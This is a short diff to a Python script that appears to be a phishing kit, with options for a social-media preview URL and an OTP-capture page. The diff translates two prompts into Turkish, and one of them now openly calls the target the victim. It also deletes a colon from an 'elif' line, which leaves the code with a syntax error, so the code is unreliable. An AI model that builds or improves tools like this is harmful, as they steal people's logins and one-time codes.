@@ -721,12 +721,12 @@ def write_meta():
         return
     while True:
         if url is None or url == "":
-            metaurl = input(f"\n{ask}{bcyan}Enter shadow url {green}({blue}for social media preview{green}){bcyan}[{red}press enter to skip{bcyan}] : {green}")
+            metaurl = input(f"\n{ask}{bcyan}Gölge URL'sini girin {green}({blue}sosyal medya önizlemesi için{green}){bcyan}[{red}atlamak için enter tuşuna basın{bcyan}] : {green}")
         else:
             metaurl = url
         if metaurl=="":
             break
-        elif metaurl == "help":
+        elif metaurl == "help"
             sprint(shadow_help)
         else:
             allmeta = get_meta(metaurl)
@@ -1274,7 +1274,7 @@ def main_menu():
             if folder == "custom" and mask == "custom":
                 customdir = customfol()
             if otp_folder != "":
-                is_otp = input(f"\n{ask}Do you want OTP Page? [y/n] > {green}")
+                is_otp = input(f"\n{ask}KURBAN İÇİN OTP ŞİFRESİ OLSUN MU ? Y/N > {green}")
                 if is_otp == "y":
                     folder = otp_folder
             break
